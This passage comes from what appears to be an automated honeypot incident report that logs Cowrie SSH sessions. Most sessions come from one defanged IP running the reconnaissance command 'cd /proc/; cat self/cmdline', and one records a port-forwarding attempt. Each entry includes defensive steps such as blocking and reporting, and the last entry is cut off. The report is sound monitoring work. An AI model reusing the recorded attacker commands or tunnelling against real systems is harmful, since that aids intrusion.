| `2026-07-13 11:42:34` | `cowrie.session.connect` |
| `2026-07-13 11:42:34` | `cowrie.login.success` |
| `2026-07-13 11:42:35` | `cowrie.session.params` |
| `2026-07-13 11:42:35` | `cowrie.command.input` |
| `2026-07-13 11:42:44` | `cowrie.log.closed` |
| `2026-07-13 11:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e032cb5ce2e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:44` | `cowrie.session.connect` |
| `2026-07-13 11:42:44` | `cowrie.login.success` |
| `2026-07-13 11:42:45` | `cowrie.session.params` |
| `2026-07-13 11:42:45` | `cowrie.command.input` |
| `2026-07-13 11:42:54` | `cowrie.log.closed` |
| `2026-07-13 11:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-423d85b04879

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:47` | `cowrie.session.connect` |
| `2026-07-13 11:42:48` | `cowrie.client.version` |
| `2026-07-13 11:42:48` | `cowrie.client.kex` |
| `2026-07-13 11:42:51` | `cowrie.login.success` |
| `2026-07-13 11:42:52` | `cowrie.session.params` |
| `2026-07-13 11:42:52` | `cowrie.command.input` |
| `2026-07-13 11:42:52` | `cowrie.log.closed` |
| `2026-07-13 11:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22d0160395da

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:42 |
| **Last Seen** | 2026-07-13 11:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:42:54` | `cowrie.session.connect` |
| `2026-07-13 11:42:54` | `cowrie.login.success` |
| `2026-07-13 11:42:55` | `cowrie.session.params` |
| `2026-07-13 11:42:55` | `cowrie.command.input` |
| `2026-07-13 11:43:04` | `cowrie.log.closed` |
| `2026-07-13 11:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65be6a2a1072

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:43 |
| **Last Seen** | 2026-07-13 11:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:43:04` | `cowrie.session.connect` |
| `2026-07-13 11:43:05` | `cowrie.login.success` |
| `2026-07-13 11:43:05` | `cowrie.session.params` |
| `2026-07-13 11:43:05` | `cowrie.command.input` |
| `2026-07-13 11:43:14` | `cowrie.log.closed` |
| `2026-07-13 11:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b41782415a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:43 |
| **Last Seen** | 2026-07-13 11:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:43:14` | `cowrie.session.connect` |
| `2026-07-13 11:43:15` | `cowrie.login.success` |
| `2026-07-13 11:43:15` | `cowrie.session.params` |
| `2026-07-13 11:43:15` | `cowrie.command.input` |
| `2026-07-13 11:43:24` | `cowrie.log.closed` |
| `2026-07-13 11:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138840a0f173

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:43 |
| **Last Seen** | 2026-07-13 11:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:43:25` | `cowrie.session.connect` |
| `2026-07-13 11:43:25` | `cowrie.login.success` |
| `2026-07-13 11:43:25` | `cowrie.session.params` |
| `2026-07-13 11:43:25` | `cowrie.command.input` |
| `2026-07-13 11:43:35` | `cowrie.log.closed` |
| `2026-07-13 11:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5785dab9666a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:43 |
| **Last Seen** | 2026-07-13 11:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:43:35` | `cowrie.session.connect` |
| `2026-07-13 11:43:35` | `cowrie.login.success` |
| `2026-07-13 11:43:35` | `cowrie.session.params` |
| `2026-07-13 11:43:36` | `cowrie.command.input` |
| `2026-07-13 11:43:45` | `cowrie.log.closed` |
| `2026-07-13 11:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ad5a07e6d55

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:43 |
| **Last Seen** | 2026-07-13 11:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:43:45` | `cowrie.session.connect` |
| `2026-07-13 11:43:45` | `cowrie.login.success` |
| `2026-07-13 11:43:46` | `cowrie.session.params` |
| `2026-07-13 11:43:46` | `cowrie.command.input` |
| `2026-07-13 11:43:55` | `cowrie.log.closed` |
| `2026-07-13 11:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137e07376207

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:43 |
| **Last Seen** | 2026-07-13 11:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:43:55` | `cowrie.session.connect` |
| `2026-07-13 11:43:55` | `cowrie.login.success` |
| `2026-07-13 11:43:56` | `cowrie.session.params` |
| `2026-07-13 11:43:56` | `cowrie.command.input` |
| `2026-07-13 11:44:05` | `cowrie.log.closed` |
| `2026-07-13 11:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c4161491d7

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:44 |
| **Last Seen** | 2026-07-13 11:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:44:05` | `cowrie.session.connect` |
| `2026-07-13 11:44:05` | `cowrie.login.success` |
| `2026-07-13 11:44:06` | `cowrie.session.params` |
| `2026-07-13 11:44:06` | `cowrie.command.input` |
| `2026-07-13 11:44:15` | `cowrie.log.closed` |
| `2026-07-13 11:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1719377b6e7

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:44 |
| **Last Seen** | 2026-07-13 11:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:44:15` | `cowrie.session.connect` |
| `2026-07-13 11:44:15` | `cowrie.login.success` |
| `2026-07-13 11:44:16` | `cowrie.session.params` |
| `2026-07-13 11:44:16` | `cowrie.command.input` |
| `2026-07-13 11:44:25` | `cowrie.log.closed` |
| `2026-07-13 11:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27170e06de0b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:44 |
| **Last Seen** | 2026-07-13 11:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:44:25` | `cowrie.session.connect` |
| `2026-07-13 11:44:25` | `cowrie.login.success` |
| `2026-07-13 11:44:26` | `cowrie.session.params` |
| `2026-07-13 11:44:26` | `cowrie.command.input` |
| `2026-07-13 11:44:35` | `cowrie.log.closed` |
| `2026-07-13 11:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-550bb65c4c2e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:44 |
| **Last Seen** | 2026-07-13 11:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:44:35` | `cowrie.session.connect` |
| `2026-07-13 11:44:35` | `cowrie.login.success` |
| `2026-07-13 11:44:36` | `cowrie.session.params` |
| `2026-07-13 11:44:36` | `cowrie.command.input` |
| `2026-07-13 11:44:45` | `cowrie.log.closed` |
| `2026-07-13 11:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6278e0eec779

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:44 |
| **Last Seen** | 2026-07-13 11:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:44:45` | `cowrie.session.connect` |
| `2026-07-13 11:44:46` | `cowrie.login.success` |
| `2026-07-13 11:44:46` | `cowrie.session.params` |
| `2026-07-13 11:44:46` | `cowrie.command.input` |
| `2026-07-13 11:44:55` | `cowrie.log.closed` |
| `2026-07-13 11:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-203c0d08e94e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 11:44 |
| **Last Seen** | 2026-07-13 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:44:51` | `cowrie.session.connect` |
| `2026-07-13 11:44:51` | `cowrie.client.version` |
| `2026-07-13 11:44:51` | `cowrie.client.kex` |
| `2026-07-13 11:44:51` | `cowrie.login.success` |
| `2026-07-13 11:44:52` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:44:52` | `cowrie.direct-tcpip.data` |
| `2026-07-13 11:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-481d7aacbdfb

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:44 |
| **Last Seen** | 2026-07-13 11:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:44:55` | `cowrie.session.connect` |
| `2026-07-13 11:44:56` | `cowrie.login.success` |
| `2026-07-13 11:44:56` | `cowrie.session.params` |
| `2026-07-13 11:44:56` | `cowrie.command.input` |
| `2026-07-13 11:45:05` | `cowrie.log.closed` |
| `2026-07-13 11:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc98878548b4

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:45 |
| **Last Seen** | 2026-07-13 11:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:45:05` | `cowrie.session.connect` |
| `2026-07-13 11:45:06` | `cowrie.login.success` |
| `2026-07-13 11:45:06` | `cowrie.session.params` |
| `2026-07-13 11:45:06` | `cowrie.command.input` |
| `2026-07-13 11:45:15` | `cowrie.log.closed` |
| `2026-07-13 11:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4948507366c1

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:45 |
| **Last Seen** | 2026-07-13 11:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:45:16` | `cowrie.session.connect` |
| `2026-07-13 11:45:16` | `cowrie.login.success` |
| `2026-07-13 11:45:16` | `cowrie.session.params` |
| `2026-07-13 11:45:16` | `cowrie.command.input` |
| `2026-07-13 11:45:26` | `cowrie.log.closed` |
| `2026-07-13 11:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2102af454ab8

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:45 |
| **Last Seen** | 2026-07-13 11:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:45:26` | `cowrie.session.connect` |
| `2026-07-13 11:45:26` | `cowrie.login.success` |
| `2026-07-13 11:45:26` | `cowrie.session.params` |
| `2026-07-13 11:45:27` | `cowrie.command.input` |
| `2026-07-13 11:45:36` | `cowrie.log.closed` |
| `2026-07-13 11:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-090fa2119d26

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:45 |
| **Last Seen** | 2026-07-13 11:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:45:36` | `cowrie.session.connect` |
| `2026-07-13 11:45:36` | `cowrie.login.success` |
| `2026-07-13 11:45:36` | `cowrie.session.params` |
| `2026-07-13 11:45:36` | `cowrie.command.input` |
| `2026-07-13 11:45:46` | `cowrie.log.closed` |
| `2026-07-13 11:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ce59c2ae6d

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:45 |
| **Last Seen** | 2026-07-13 11:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:45:46` | `cowrie.session.connect` |
| `2026-07-13 11:45:46` | `cowrie.login.success` |
| `2026-07-13 11:45:47` | `cowrie.session.params` |
| `2026-07-13 11:45:47` | `cowrie.command.input` |
| `2026-07-13 11:45:56` | `cowrie.log.closed` |
| `2026-07-13 11:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9495c61725b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:45 |
| **Last Seen** | 2026-07-13 11:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:45:56` | `cowrie.session.connect` |
| `2026-07-13 11:45:56` | `cowrie.login.success` |
| `2026-07-13 11:45:57` | `cowrie.session.params` |
| `2026-07-13 11:45:57` | `cowrie.command.input` |
| `2026-07-13 11:46:06` | `cowrie.log.closed` |
| `2026-07-13 11:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3503ff276fd3

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:46 |
| **Last Seen** | 2026-07-13 11:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:46:06` | `cowrie.session.connect` |
| `2026-07-13 11:46:06` | `cowrie.login.success` |
| `2026-07-13 11:46:07` | `cowrie.session.params` |
| `2026-07-13 11:46:07` | `cowrie.command.input` |
| `2026-07-13 11:46:16` | `cowrie.log.closed` |
| `2026-07-13 11:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d61bb673a8d1

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:46 |
| **Last Seen** | 2026-07-13 11:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:46:16` | `cowrie.session.connect` |
| `2026-07-13 11:46:16` | `cowrie.login.success` |
| `2026-07-13 11:46:17` | `cowrie.session.params` |
| `2026-07-13 11:46:17` | `cowrie.command.input` |
| `2026-07-13 11:46:26` | `cowrie.log.closed` |
| `2026-07-13 11:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-485ccbfd24c8

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:46 |
| **Last Seen** | 2026-07-13 11:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:46:26` | `cowrie.session.connect` |
| `2026-07-13 11:46:26` | `cowrie.login.success` |
| `2026-07-13 11:46:27` | `cowrie.session.params` |
| `2026-07-13 11:46:27` | `cowrie.command.input` |
| `2026-07-13 11:46:36` | `cowrie.log.closed` |
| `2026-07-13 11:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16928abdb5df

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:46 |
| **Last Seen** | 2026-07-13 11:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:46:36` | `cowrie.session.connect` |
| `2026-07-13 11:46:36` | `cowrie.login.success` |
| `2026-07-13 11:46:37` | `cowrie.session.params` |
| `2026-07-13 11:46:37` | `cowrie.command.input` |
| `2026-07-13 11:46:46` | `cowrie.log.closed` |
| `2026-07-13 11:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ee981c136c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:46 |
| **Last Seen** | 2026-07-13 11:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:46:46` | `cowrie.session.connect` |
| `2026-07-13 11:46:47` | `cowrie.login.success` |
| `2026-07-13 11:46:47` | `cowrie.session.params` |
| `2026-07-13 11:46:47` | `cowrie.command.input` |
| `2026-07-13 11:46:56` | `cowrie.log.closed` |
| `2026-07-13 11:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687321c78d55

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 11:46 |
| **Last Seen** | 2026-07-13 11:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:46:56` | `cowrie.session.connect` |
